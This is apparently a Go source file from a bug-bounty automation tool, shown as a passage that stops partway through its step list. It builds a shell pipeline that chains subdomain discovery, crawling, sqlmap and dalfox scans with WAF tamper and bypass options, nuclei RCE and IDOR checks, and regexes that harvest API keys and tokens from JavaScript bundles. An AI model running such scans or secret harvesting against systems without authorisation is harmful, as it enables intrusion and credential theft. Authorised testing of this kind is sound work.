package pipeline

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/CyberShuriken/rfuf/internal/checkpoint"
	"github.com/CyberShuriken/rfuf/internal/cli"
	"github.com/CyberShuriken/rfuf/internal/config"
	"github.com/CyberShuriken/rfuf/internal/coverage"
	"github.com/CyberShuriken/rfuf/internal/evidence"
	"github.com/CyberShuriken/rfuf/internal/executor"
	"github.com/CyberShuriken/rfuf/internal/owasp"
	"github.com/CyberShuriken/rfuf/internal/scope"
	"github.com/CyberShuriken/rfuf/internal/summary"
)

// pickWordlist prefers the small, curated Seclists raft-small-directories.txt.
func pickWordlist(paths *config.Paths) string {
	if paths.UserWordlist != "" {
		return paths.UserWordlist
	}
	if paths.AssetnoteWordlist != "" {
		return paths.AssetnoteWordlist
	}
	if paths.SeclistsDirWordlistSmall != "" {
		return paths.SeclistsDirWordlistSmall
	}
	return paths.SeclistsDirWordlist
}

func effectiveStepTimeout(global, perStep time.Duration) time.Duration {
	switch {
	case perStep == 0:
		return global
	case global == 0:
		return perStep
	case perStep < global:
		return perStep
	default:
		return global
	}
}

type Step struct {
	ID      string
	Command string
	Tool    string // primary tool used (e.g. "subfinder", "gau")
	Type    string // "default", "grep"
	Deps    []string
	Timeout time.Duration
}

var (
	uiLock sync.Mutex

		stepTools = map[string]string{
			"subfinder":            "subfinder",
			"assetfinder":         "assetfinder",
			"crtsh":               "curl",
			"scope_guard":          "awk",
			"katana_crawl":         "katana",
			"gau_urls":             "gau",
			"wayback_urls":         "waybackurls",
			"dirbrute_ffuf":        "ffuf",
			"sqlmap_scan":          "sqlmap",
			"xss_scan":             "dalfox",
			"nuclei_exposures":     "nuclei",
			"nuclei_misconfigs":    "nuclei",
			"nuclei_auth_scan":     "nuclei",
			"nuclei_graphql_scan":   "nuclei",
			"nuclei_rfuf_pass":     "nuclei",
			"waf_detect":           "wafw00f",
			"port_scan_naabu":      "naabu",
			"hidden_params_arjun":  "arjun",
			"ghauri_sqli":          "ghauri",
		}
			softStages = map[string]bool{
			"scope_guard":          true,
			"crtsh":               true,
			"subfinder":            true,
			"assetfinder":         true,
			"jsmap_scrape":         true,
			"hidden_params_arjun":  true,
			"katana_crawl":         true,
			"merge_brute_subs":     true,
			"merge_js_endpoints":   true,
			"dirbrute_ffuf":        true,
			"gau_urls":             true,
			"wayback_urls":         true,
			"sqlmap_scan":          true,
			"xss_scan":             true,
			"nuclei_exposures":     true,
			"nuclei_misconfigs":    true,
			"nuclei_auth_scan":     true,
			"nuclei_graphql_scan":   true,
			"nuclei_rfuf_pass":     true,
			"env_secrets_run":       true,
			"git_exposure_run":      true,
			"nextjs_bypass_run":    true,
			"paramsprayer_run":      true,
			"s3_audit_run":         true,
			"api_version_gen":      true,
			"idor_run":             true,
			"waf_detect":            true,
			"port_scan_naabu":      true,
		}

	nucleiOptimized = " -rl ${RFUF_MAX_STAGE_REQUESTS:-300} -c 50 -bs 25 -timeout 5 -retries 1 -silent -stats -stats-interval 30"
	maxScanTargets = 5000
	urlMinerTimeout = "10m"
	sqlmapScanTimeout = "15m"
	xssScanTimeout = "10m"
	xssScanTargetCap = 500
	sqlmapTargetCap = 300
	sqlmapHighSignalParams = "[?&](id|uid|user|account|order|doc|product|category|page|article|comment|msg|post|search|query|sort|filter|view|file|path|load|page_id|item_id|news_id|report_id|invoice)="
	ghauriTargetCap = 200
	jsAssetTotalCap     = 5000
	nucleiTargetCap     = 10000
	katanaTargetCap     = 200
	katanaCrawlDuration = "10m"
	katanaStepTimeout   = 12 * time.Minute
)

const filterTestableRef = "go run ./cmd/filter-testable"
const findingsRunnerRef = "go run ./cmd/findings-runner"

func buildAuthHeaderSnippet() string {
	return `
AUTH_HEADERS=()
[ -n "$RFUF_AUTH_COOKIE" ] && AUTH_HEADERS+=(-H "Cookie: $RFUF_AUTH_COOKIE")
[ -n "$RFUF_AUTH_HEADER" ] && AUTH_HEADERS+=(-H "Authorization: $RFUF_AUTH_HEADER")
[ -n "$RFUF_BUG_BOUNTY_USERNAME" ] && AUTH_HEADERS+=(-H "X-Bug-Bounty: $RFUF_BUG_BOUNTY_USERNAME" -H "X-HackerOne-Research: $RFUF_BUG_BOUNTY_USERNAME")
[ -n "$RFUF_TEST_ACCOUNT_EMAIL" ] && AUTH_HEADERS+=(-H "X-Test-Account-Email: $RFUF_TEST_ACCOUNT_EMAIL")
`
}

func buildAuthSqlmapCmd() string {
	return `
SQLMAP_AUTH_ARGS=()
[ -n "$RFUF_AUTH_COOKIE" ] && SQLMAP_AUTH_ARGS+=("--cookie=$RFUF_AUTH_COOKIE")
[ -n "$RFUF_AUTH_HEADER" ] && SQLMAP_AUTH_ARGS+=("--header=$RFUF_AUTH_HEADER")
`
}

func buildWafTamperSnippet() string {
	return `
WAF_SQLMAP_TAMPER=""
[ -n "$RFUF_WAF_TAMPER" ] && WAF_SQLMAP_TAMPER="$RFUF_WAF_TAMPER"
WAF_DALFOX_BYPASS=""
[ -n "$RFUF_WAF_BYPASS" ] && WAF_DALFOX_BYPASS="$RFUF_WAF_BYPASS"
`
}

func GetSteps(domain string, paths *config.Paths) []Step {
	parsed, err := scope.Parse(domain)
	if err != nil {
		parsed = scope.Scope{Input: domain, RootDomain: domain, Mode: scope.ExactMode}
	}
	return GetStepsForScope(parsed, paths)
}

func GetStepsForScope(scanScope scope.Scope, paths *config.Paths) []Step {
	domain := scanScope.RootDomain
	domainEscaped := strings.ReplaceAll(domain, ".", "\\.")
	wordlist := pickWordlist(paths)
	authSnip := buildAuthHeaderSnippet()
	wildcardPattern := fmt.Sprintf(`^https?://([^/]+\.)?%s(/|$|[[:space:]])`, domainEscaped)
	if scanScope.Mode == scope.ExactMode {
		wildcardPattern = fmt.Sprintf(`^https?://%s(/|$|[[:space:]])`, domainEscaped)
	}

	disc := func(id, fullCmd, out string) string {
		if scanScope.Mode == scope.ExactMode {
			return fmt.Sprintf("echo %s > %s", domain, out)
		}
		return fullCmd
	}

	subdomainBruteCmd := "exit 0"
	if scanScope.Mode != scope.ExactMode {
		subdomainBruteCmd = fmt.Sprintf(`set +e
: > brute_subs.txt
if [ "$RFUF_SCOPE_MODE" != "wildcard" ]; then
  exit 0
fi
if [ -s "%s" ]; then
  sed "s|$|.%s|" "%s" | dnsx -silent -o brute_subs.txt
fi
sort -u brute_subs.txt -o brute_subs.txt
exit 0`, wordlist, domain, wordlist)
	}

	return []Step{
		{"setup_directories", fmt.Sprintf("mkdir -p %s", paths.WorkDir), "default", "default", nil, 0},
		{"subfinder", disc("subfinder", fmt.Sprintf("subfinder -d %s -all -o subfinder.txt", domain), "subfinder.txt"), "subfinder", "default", []string{"setup_directories"}, 0},
		{"assetfinder", disc("assetfinder", fmt.Sprintf("assetfinder --subs-only %s > assetfinder.txt", domain), "assetfinder.txt"), "assetfinder", "default", []string{"setup_directories"}, 0},
		{"crtsh", fmt.Sprintf("curl -s \"https://crt.sh/?q=%%25.%s&output=json\" | jq -r '.[] | .name_value' | sort -u > crtsh.txt", domain), "curl", "default", []string{"setup_directories"}, 0},
		{"merge_subs", "touch subfinder.txt assetfinder.txt crtsh.txt; cat subfinder.txt assetfinder.txt crtsh.txt | sort -u > subs.txt", "cat", "default", []string{"subfinder", "assetfinder", "crtsh"}, 0},
		{"scope_guard", `set +e
ROOT=$(printf '%s' "$RFUF_DOMAIN" | tr '[:upper:]' '[:lower:]' | sed 's/\.$//')
[ -f subs.txt ] || : > subs.txt
WILDCARD=0
[ "$RFUF_SCOPE_MODE" = "wildcard" ] && WILDCARD=1
: > in_scope_hosts.txt
: > out_of_scope_hosts.txt
awk -v root="$ROOT" -v wildcard="$WILDCARD" '
  function lower(s) { return tolower(s) }
  {
    host=lower($0); sub(/\.$/, "", host)
    if (host == root || (wildcard == 1 && length(host) > length(root)+1 && substr(host, length(host)-length(root), length(root)+1) == "." root)) print host > "in_scope_hosts.txt"
    else print $0 > "out_of_scope_hosts.txt"
  }
' subs.txt || :
sort -u in_scope_hosts.txt -o in_scope_hosts.txt 2>/dev/null || :
sort -u out_of_scope_hosts.txt -o out_of_scope_hosts.txt 2>/dev/null || :
if [ "$WILDCARD" = "0" ] && [ $(wc -l < out_of_scope_hosts.txt 2>/dev/null || echo 0) -gt 10 ]; then
  echo "[!] Warning: You are in EXACT mode. $(wc -l < out_of_scope_hosts.txt) subdomains were filtered out. Use --wildcard to scan them." >&2
fi
: > scoped_subs.txt
cat in_scope_hosts.txt > scoped_subs.txt 2>/dev/null || :
IN=$(wc -l < scoped_subs.txt | tr -d ' ')
OUT=$(wc -l < out_of_scope_hosts.txt | tr -d ' ')
printf '{"input":"%s","root_domain":"%s","mode":"%s","in_scope":%s,"out_of_scope":%s,"policy":"%s"}
' "$RFUF_SCOPE_INPUT" "$ROOT" "$RFUF_SCOPE_MODE" "${IN:-0}" "${OUT:-0}" "$RFUF_SCOPE_MODE" > scope.json
touch scope.json in_scope_hosts.txt out_of_scope_hosts.txt scoped_subs.txt`, "awk", "default", []string{"merge_subs"}, 0},
		{"dnsx_resolve", "dnsx -l scoped_subs.txt -silent -o live_subs.txt", "dnsx", "default", []string{"scope_guard"}, 0},
		{"subdomain_brute", subdomainBruteCmd, "dnsx", "grep", []string{"dnsx_resolve"}, 0},
		{"merge_brute_subs", "cat scoped_subs.txt brute_subs.txt | sort -u > subs_with_brute.txt && mv subs_with_brute.txt live_subs.txt", "cat", "default", []string{"subdomain_brute"}, 0},
		{"httpx_probe", fmt.Sprintf("%s\nhttpx -l live_subs.txt -silent -status-code -title -tech-detect -o alive.txt", authSnip), "httpx", "default", []string{"merge_brute_subs"}, 0},
		{"s3_audit_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner s3auditor .", authSnip), "findings-runner", "default", []string{"httpx_probe"}, 0},
		{"tech_fingerprint", "httpx -l alive.txt -silent -tech-detect -o tech_fingerprint.txt", "httpx", "default", []string{"httpx_probe"}, 0},
		{"api_discovery", fmt.Sprintf(`%s
set +e
mkdir -p api_specs
fetch_spec() {
  HOST=$1
  SAFE_HOST=$(echo "$HOST" | sed 's|https\?://||;s|[:/.]|_|g')
  for PATH in /openapi.json /swagger.json /api/openapi.json /api/swagger.json /sitemap.xml /robots.txt /.well-known/openid-configuration; do
    URL="${HOST}${PATH}"
    if curl -sk --max-time 5 -o "${SAFE_HOST}$(echo $PATH | sed 's|^/||;s|/|_|g').json" "$URL" && [ -s "${SAFE_HOST}$(echo $PATH | sed 's|^/||;s|/|_|g').json" ]; then
      echo "[+] Found spec: $URL"
    fi
  done
}
export -f fetch_spec
cat alive.txt | xargs -P 10 -I{} bash -c 'fetch_spec "{}"'
exit 0`, authSnip), "curl", "default", []string{"httpx_probe"}, 0},
		{"jsmap_scrape", fmt.Sprintf(`%s
set +e
resolve_asset() {
  REF="$1"; BASE="$2"
  case "$REF" in
    https://*|http://*) printf '%%s\\n' "$REF" ;;
    //* ) printf 'https:%%s\\n' "$REF" ;;
    /* ) printf '%%s%%s\\n' "$(echo "$BASE" | sed 's|\\(https\\?://[^/]*\\).*|\\1|')" "$REF" ;;
    * ) printf '%%s/%%s\\n' "${BASE%%/}" "${REF#./}" ;;
  esac
}
while read -r HOST; do
  [ -n "$HOST" ] || continue
  PREFIX=$(echo "$HOST" | sed 's|https\\?://||;s|[^A-Za-z0-9._-]|_|g')
  PAGE="js_bundles/${PREFIX}_page.html"
  fetch_asset "$HOST" "$PAGE"
  {
    grep -oE 'src="[^"]+"|href="[^"]+"' "$PAGE" 2>/dev/null | sed -E 's/^[^=]+="//;s/"$//'
    grep -oE "src='[^']+'|href='[^']+'" "$PAGE" 2>/dev/null | sed -E "s/^[^=]+='//;s/'$//"
    printf '%%s\\n' /manifest.json /asset-manifest.json /manifest.webmanifest /build-manifest.json /routes-manifest.json /_next/build-manifest.json /_next/static/chunks/webpack.js /static/js/main.js
  } | while read -r REF; do
    [ -n "$REF" ] || continue
    FULL=$(resolve_asset "$REF" "$HOST")
    echo "$FULL" | grep -Eiq '\\.(js|mjs|map|json|webmanifest)([?#].*)?$|/(manifest|asset-manifest|build-manifest|routes-manifest)(\\.json)?([?#].*)?$|/_next/static/' || continue
    echo "$FULL" >> js_assets.txt
  done
done < alive.txt
sort -u js_assets.txt -o js_assets.txt
head -n %d js_assets.txt > js_assets.capped && mv js_assets.capped js_assets.txt
while read -r FULL_URL; do
  [ -n "$FULL_URL" ] || continue
  PREFIX=$(echo "$FULL_URL" | sed 's|https\\?://||;s|[^A-Za-z0-9._-]|_|g')
  NAME=$(printf '%%s' "$FULL_URL" | md5sum | cut -d' ' -f1)
  OUT="js_bundles/${PREFIX}_${NAME}.js"
  echo "$FULL_URL" | grep -Eiq '\\.(json|webmanifest)([?#].*)?$|manifest|buildManifest' && OUT="js_bundles/${PREFIX}_${NAME}.json"
  fetch_asset "$FULL_URL" "$OUT" || { echo "$FULL_URL" >> js_asset_errors.txt; continue; }
  [ -s "$OUT" ] || continue
  HOST_BASE=$(echo "$FULL_URL" | sed 's|\\(https\\?://[^/]*\\).*|\\1|')
  {
    grep -oE '"(/[A-Za-z0-9_./?&=-]+)"' "$OUT" 2>/dev/null | tr -d '"'
    grep -oE "'/[A-Za-z0-9_./?&=-]+'" "$OUT" 2>/dev/null | tr -d "'"
  } | while read -r PATH_CAND; do
    case "$PATH_CAND" in /*) echo "$HOST_BASE$PATH_CAND" ;; esac
  done >> "endpoints_found/${PREFIX}.txt"
  grep -Eoh '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk-(test_|live_)?[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_-]{35}|xox[baprs]-[A-Za-z0-9-]{10,}|eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9_.+/=-]+)' "$OUT" 2>/dev/null | sort -u >> "js_secrets/${PREFIX}.txt"
done < js_assets.txt
cat endpoints_found/*.txt 2>/dev/null | sort -u | head -2000 > js_endpoints.txt
cat js_secrets/*.txt 2>/dev/null | sort -u > js_secrets.txt
printf 'assets=%%s errors=%%s endpoints=%%s\\n' "$(wc -l < js_assets.txt 2>/dev/null || echo 0)" "$(wc -l < js_asset_errors.txt 2>/dev/null || echo 0)" "$(wc -l < js_endpoints.txt 2>/dev/null || echo 0)" > jsmap_status.txt
exit 0`, authSnip, jsAssetTotalCap), "grep", "grep", []string{"httpx_probe"}, 0},
		{"trufflehog_scan", `set +e
: > trufflehog_results.txt
: > trufflehog_stderr.log
printf '{"status":"not_started","inputs":0,"findings":0}\n' > trufflehog_status.json
if ! command -v trufflehog >/dev/null 2>&1; then
  printf '{"status":"not_installed","inputs":0,"findings":0}\n' > trufflehog_status.json
  exit 0
fi
trufflehog --version > trufflehog_version.txt 2> trufflehog_stderr.log
INPUTS=()
[ -s clean_katana_urls.txt ] && INPUTS+=(clean_katana_urls.txt)
[ -s js_endpoints.txt ] && INPUTS+=(js_endpoints.txt)
[ -d js_bundles ] && [ -n "$(find js_bundles -type f -size +0c -print -quit 2>/dev/null)" ] && INPUTS+=(js_bundles)
[ -d js_secrets ] && [ -n "$(find js_secrets -type f -size +0c -print -quit 2>/dev/null)" ] && INPUTS+=(js_secrets)
[ -d api_specs ] && [ -n "$(find api_specs -type f -size +0c -print -quit 2>/dev/null)" ] && INPUTS+=(api_specs)
INPUT_COUNT=${#INPUTS[@]}
if [ "$INPUT_COUNT" -eq 0 ]; then
  printf '{"status":"no_inputs","inputs":0,"findings":0}\n' > trufflehog_status.json
  exit 0
fi
trufflehog filesystem "${INPUTS[@]}" --results=verified,unknown --json > trufflehog_results.txt 2> trufflehog_stderr.log
RC=$?
sort -u trufflehog_results.txt -o trufflehog_results.txt 2>/dev/null
FINDING_COUNT=$(grep -cve '^$' trufflehog_results.txt 2>/dev/null || echo 0)
if [ "$RC" -eq 0 ]; then STATUS=completed; else STATUS=scan_error; fi
printf '{"status":"%s","inputs":%s,"findings":%s,"exit_code":%s}\n' "$STATUS" "$INPUT_COUNT" "$FINDING_COUNT" "$RC" > trufflehog_status.json
exit 0`, "trufflehog", "grep", []string{"katana_crawl", "jsmap_scrape", "api_discovery"}, 0},
		{"grep_secrets", `: > potential_secrets.txt
grep -Eih '(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}|xox[baprs]-[A-Za-z0-9-]{10,}|sk-(test_|live_)?[A-Za-z0-9]{24,}|sk_live_[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_-]{35}|ya29\.[0-9A-Za-z_-]{50,}|eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9_.+/=-]+|Bearer\s+[A-Za-z0-9._=-]{20,}|["'"'"'\]](api[_-]?key|apikey|secret[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key)["'"'"']?\s*[=:]\s*["'"'"']?[A-Za-z0-9+/=_-]{20,}|[?&](api[_-]?key|apikey|secret|token|access_token|client_secret)=[A-Za-z0-9+/=_-]{20,})' clean_katana_urls.txt 2>/dev/null \
  | grep -Ev '(plaid[_-]?link[_-]?token|_next/static/chunks|pages/lib|/holdings/plaid|/holdings/exchange|ReactPropTypesSecret|auth/refresh[-_]?token|password[-_]?reset|/authentication/v1/|/static/js/.*refresh[-_]?token|exchange[-_]?plaid[-_]?token)' \
  | sort -u > potential_secrets.txt
# Also scan JS bundles for embedded secrets (no URL false positives here)
[ -s js_bundles/ ] && grep -Eroh '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk-(test_|live_)?[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_-]{35}|eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9_.+/=-]+|xox[baprs]-[A-Za-z0-9-]{10,}|sk_live_[A-Za-z0-9]{24,}|ya29\.[0-9A-Za-z_-]{50,})' js_bundles/ 2>/dev/null | sort -u >> js_secrets.txt
exit 0`, "grep", "grep", []string{"katana_crawl", "jsmap_scrape"}, 0},
		{"katana_crawl", fmt.Sprintf("head -n %d alive.txt > katana_targets.txt && katana -list katana_targets.txt -jc -kf all -d 2 -ct 10m -timeout 10 -iqp -o katana_urls.txt && sort -u katana_urls.txt -o clean_katana_urls.txt", katanaTargetCap), "katana", "default", []string{"httpx_probe"}, katanaStepTimeout},
		{"gau_urls", fmt.Sprintf("[ -s live_subs.txt ] && timeout %s cat live_subs.txt | gau --threads 5 --subs | tee gau_urls.txt", urlMinerTimeout), "gau", "default", []string{"merge_brute_subs"}, 10 * time.Minute},
		{"wayback_urls", fmt.Sprintf("[ -s live_subs.txt ] && timeout %s cat live_subs.txt | waybackurls | tee wayback_urls.txt", urlMinerTimeout), "waybackurls", "default", []string{"merge_brute_subs"}, 10 * time.Minute},
		{"spec_parser", "go run ./cmd/findings-runner specparser .", "findings-runner", "default", []string{"api_discovery"}, 0},
		{"merge_all_urls", `: > all_urls.txt
touch gau_urls.txt wayback_urls.txt clean_katana_urls.txt openapi_paths.txt
cat gau_urls.txt wayback_urls.txt clean_katana_urls.txt openapi_paths.txt 2>/dev/null | sort -u > all_urls.txt
exit 0`, "cat", "default", []string{"gau_urls", "wayback_urls", "katana_crawl", "api_discovery", "spec_parser"}, 0},
		{"uro_dedup", "if command -v uro >/dev/null 2>&1; then uro < all_urls.txt > uro_urls.txt; cp uro_urls.txt all_urls.txt; else sort -u all_urls.txt -o all_urls.txt; fi", "uro", "grep", []string{"merge_all_urls"}, 0},
		{"url_filter_alive", fmt.Sprintf(`%s
if [ -n "$RFUF_EXCLUDE_URL_REGEX" ]; then
  grep -Ev -- "$RFUF_EXCLUDE_URL_REGEX" all_urls.txt > all_urls_scannable.txt || cp all_urls.txt all_urls_scannable.txt
else
  cp all_urls.txt all_urls_scannable.txt
fi
httpx -l all_urls_scannable.txt -silent -status-code -mc 200,301,302,401,403,405,500 "${AUTH_HEADERS[@]}" > all_urls_status.txt
grep -E " \[(200|301|302)\]" all_urls_status.txt | awk '{print $1}' > all_urls_200.txt
grep -E " \[(401|403|500)\]" all_urls_status.txt > high_interest_urls.txt
rm -f all_urls_status.txt`, authSnip), "httpx", "grep", []string{"uro_dedup", "merge_js_endpoints"}, 0},
		{"nextjs_bypass_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner nextjsbypass .", authSnip), "findings-runner", "default", []string{"url_filter_alive"}, 0},
		{"bypass403", "go run ./cmd/findings-runner bypass403 .", "findings-runner", "default", []string{"url_filter_alive"}, 0},
		{"ffuf_js_endpoints", fmt.Sprintf(`if [ -s js_endpoints.txt ]; then
		  ffuf -w js_endpoints.txt:URL -w %s:WORD -u "URL/WORD" -mc 200,301,302,401,403,405 -ac -t 30 -maxtime 1200 -recursion -recursion-depth 1 -o ffuf_js_results.json -of json -s
		  jq -r ".results[]? | .url" ffuf_js_results.json 2>/dev/null >> js_endpoints.txt
		  sort -u js_endpoints.txt -o js_endpoints.txt
		fi
		exit 0`, wordlist), "ffuf", "default", []string{"jsmap_scrape"}, 0},
		{"merge_js_endpoints", `set +e
						cat js_endpoints.txt 2>/dev/null | grep -E '^https?://' | sort -u > js_endpoints_full.txt
						cat all_urls.txt js_endpoints_full.txt 2>/dev/null | grep -E '^https?://' | sort -u > all_urls_with_js.txt
						mv all_urls_with_js.txt all_urls.txt
						printf 'js_endpoints=%s all_urls=%s\\n' "$(wc -l < js_endpoints_full.txt 2>/dev/null || echo 0)" "$(wc -l < all_urls.txt 2>/dev/null || echo 0)" > merge_js_endpoints_status.txt
						exit 0`, "cat", "grep", []string{"merge_all_urls", "ffuf_js_endpoints"}, 0},
		{"scope_filter", fmt.Sprintf(`set +e
filter_stream() {
  IN="$1"; OUT="$2"; TMP="$OUT.tmp"
  : > "$TMP"
  [ -f "$IN" ] || { : > "$OUT"; return 0; }
  if [ -n "$RFUF_EXCLUDE_URL_REGEX" ]; then
    grep -Eiv -- "$RFUF_EXCLUDE_URL_REGEX" "$IN" > "$TMP" || :
  else
    cp "$IN" "$TMP"
  fi
  grep -E '%s' "$TMP" > "$OUT" || :
  rm -f "$TMP"
}
filter_stream all_urls.txt all_urls_scannable.txt
filter_stream all_urls_200.txt all_urls_200_scannable.txt
filter_stream high_interest_urls.txt high_interest_urls_scannable.txt
filter_stream js_endpoints.txt js_endpoints_scannable.txt
head -n "${RFUF_MAX_TARGETS:-10000}" all_urls_scannable.txt > all_urls_scannable.capped 2>/dev/null && mv all_urls_scannable.capped all_urls_scannable.txt || :
head -n "${RFUF_MAX_TARGETS:-10000}" all_urls_200_scannable.txt > all_urls_200_scannable.capped 2>/dev/null && mv all_urls_200_scannable.capped all_urls_200_scannable.txt || :
head -n "${RFUF_MAX_TARGETS:-10000}" high_interest_urls_scannable.txt > high_interest_urls_scannable.capped 2>/dev/null && mv high_interest_urls_scannable.capped high_interest_urls_scannable.txt || :
head -n "${RFUF_MAX_TARGETS:-10000}" js_endpoints_scannable.txt > js_endpoints_scannable.capped 2>/dev/null && mv js_endpoints_scannable.capped js_endpoints_scannable.txt || :
cp all_urls_scannable.txt all_urls.txt 2>/dev/null || :
cp all_urls_200_scannable.txt all_urls_200.txt 2>/dev/null || :
cp high_interest_urls_scannable.txt high_interest_urls.txt 2>/dev/null || :
cp js_endpoints_scannable.txt js_endpoints.txt 2>/dev/null || :
printf 'all_urls=%%s all_urls_200=%%s js_endpoints=%%s max_targets=%%s max_stage_requests=%%s\\n' "$(wc -l < all_urls.txt 2>/dev/null || echo 0)" "$(wc -l < all_urls_200.txt 2>/dev/null || echo 0)" "$(wc -l < js_endpoints.txt 2>/dev/null || echo 0)" "${RFUF_MAX_TARGETS:-10000}" "${RFUF_MAX_STAGE_REQUESTS:-300}" > scope_filter_status.txt
exit 0`, wildcardPattern), "grep", "grep", []string{"merge_js_endpoints"}, 0},
		{"nuclei_target_merge", fmt.Sprintf(`set +e
{
  awk '{print $1}' alive.txt 2>/dev/null
  awk '{print $1}' all_urls_200.txt 2>/dev/null
  cat js_endpoints.txt 2>/dev/null
} | grep -E '^https?://' | sed 's/[[:space:]]*$//' | sort -u | head -n %d > nuclei_targets.txt
printf 'inputs alive=%%s urls=%%s js=%%s targets=%%s\\n' "$(wc -l < alive.txt 2>/dev/null || echo 0)" "$(wc -l < all_urls_200.txt 2>/dev/null || echo 0)" "$(wc -l < js_endpoints.txt 2>/dev/null || echo 0)" "$(wc -l < nuclei_targets.txt 2>/dev/null || echo 0)" > nuclei_targets_status.txt
exit 0`, nucleiTargetCap), "awk", "grep", []string{"scope_filter"}, 0},
		{"nuclei_exposures", fmt.Sprintf("%s\nnuclei -l nuclei_targets.txt -tags exposure %s -o credentials_found.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"nuclei_target_merge"}, 0},
		{"nuclei_misconfigs", fmt.Sprintf("%s\nnuclei -l nuclei_targets.txt -tags misconfig %s -o misconfigs.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"nuclei_target_merge"}, 0},
		{"nuclei_auth_scan", fmt.Sprintf("%s\nnuclei -l nuclei_targets.txt -tags auth %s -o auth_results.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"nuclei_target_merge"}, 0},
		{"nuclei_graphql_scan", fmt.Sprintf("%s\nnuclei -l nuclei_targets.txt -tags graphql %s -o nuclei_graphql_scan.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"nuclei_target_merge"}, 0},
		{"filter_testable_sqli", fmt.Sprintf(`%s . all_urls_200.txt > sqli_targets_filtered.txt
[ -s sqli_targets_filtered.txt ] && { gf sqli sqli_targets_filtered.txt >> sqli_targets.txt; grep -Ei '%s' sqli_targets_filtered.txt >> sqli_targets.txt; }
[ -s sqli_targets.txt ] && sort -u sqli_targets.txt -o sqli_targets.txt
[ -s sqli_targets.txt ] && head -n %d sqli_targets.txt > sqli_targets.txt.capped && mv sqli_targets.txt.capped sqli_targets.txt
exit 0`, filterTestableRef, sqlmapHighSignalParams, sqlmapTargetCap), "filter-testable", "grep", []string{"scope_filter"}, 0},
		{"sqli_targets_replace", `[ -s sqli_targets.txt ] || cp sqli_targets_filtered.txt sqli_targets.txt 2>/dev/null
exit 0`, "cp", "grep", []string{"filter_testable_sqli"}, 0},
		{"sqlmap_scan", fmt.Sprintf(`%s
%s
mkdir -p sqlmap_results
head -n %d sqli_targets.txt > sqlmap_targets.txt 2>/dev/null || : > sqlmap_targets.txt
TARGET_COUNT=$(wc -l < sqlmap_targets.txt 2>/dev/null || echo 0)
printf '{"target_count":%%s,"timeout":"%s"}\n' "$TARGET_COUNT" > sqlmap_status.json
if [ "$TARGET_COUNT" -gt 0 ]; then
  timeout %s sqlmap -m sqlmap_targets.txt --batch --random-agent --flush-session --technique=BEUSTQ --level=3 --risk=1 --output-dir=./sqlmap_results "${SQLMAP_AUTH_ARGS[@]}" ${WAF_SQLMAP_TAMPER:+--tamper=$WAF_SQLMAP_TAMPER} > sqlmap_stdout.log 2> sqlmap_stderr.log
fi
exit 0`, buildAuthSqlmapCmd(), buildWafTamperSnippet(), sqlmapTargetCap, sqlmapScanTimeout, sqlmapScanTimeout), "sqlmap", "default", []string{"sqli_targets_replace", "waf_detect"}, 15 * time.Minute},
		{"xss_targets", fmt.Sprintf(`%s . all_urls_200.txt > xss_targets_filtered.txt
[ -s xss_targets_filtered.txt ] && grep -Ei "q=|search|query|keyword|text|name|email|msg|redirect|url=" xss_targets_filtered.txt > xss_targets.txt
gf xss xss_targets_filtered.txt >> xss_targets.txt 2>/dev/null
sort -u xss_targets.txt -o xss_targets.txt
[ -s xss_targets.txt ] && head -n %d xss_targets.txt > xss_targets.txt.capped && mv xss_targets.txt.capped xss_targets.txt
exit 0`, filterTestableRef, xssScanTargetCap), "filter-testable", "grep", []string{"scope_filter"}, 0},
		{"xss_scan", fmt.Sprintf(`%s
%s
head -n %d xss_targets.txt > xss_targets_capped.txt
[ -s xss_targets_capped.txt ] && timeout %s bash -c 'cat xss_targets_capped.txt | Gxss -p khXSS | dalfox pipe --mining-dom -o xss_vulnerabilities.txt ${WAF_DALFOX_BYPASS:+--bypass=$WAF_DALFOX_BYPASS}'
touch xss_vulnerabilities.txt
exit 0`, authSnip, buildWafTamperSnippet(), xssScanTargetCap, xssScanTimeout), "dalfox", "default", []string{"xss_targets", "waf_detect"}, 10 * time.Minute},
		{"rce_targets", fmt.Sprintf(`%s . all_urls_200.txt > rce_targets_filtered.txt
{ gf rce rce_targets_filtered.txt; grep -Ei '[?&](cmd|exec|command|ping|daemon|upload|shell|code)=' rce_targets_filtered.txt; } | sort -u | head -n %d > rce_targets.txt
exit 0`, filterTestableRef, maxScanTargets), "filter-testable", "grep", []string{"scope_filter"}, 0},
		{"rce_scan", fmt.Sprintf("%s\n[ -s rce_targets.txt ] && nuclei -l rce_targets.txt -tags rce -severity high,critical %s \"${AUTH_HEADERS[@]}\" -o nuclei_rce_rce.txt || : > nuclei_rce_rce.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"rce_targets"}, 0},
		{"idor_targets", fmt.Sprintf(`%s . all_urls_200.txt > idor_targets_filtered.txt
{ gf idor idor_targets_filtered.txt; grep -Ei '[?&](id|account|order|doc|profile|booking|reservation|uid|user_id)=' idor_targets_filtered.txt; } | sort -u | head -n %d > idor_targets.txt
exit 0`, filterTestableRef, maxScanTargets), "filter-testable", "grep", []string{"scope_filter"}, 0},
		{"idor_scan", fmt.Sprintf("%s\nnuclei -l idor_targets.txt -tags idor %s \"${AUTH_HEADERS[@]}\" -o idor_vulnerabilities.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"idor_targets"}, 0},
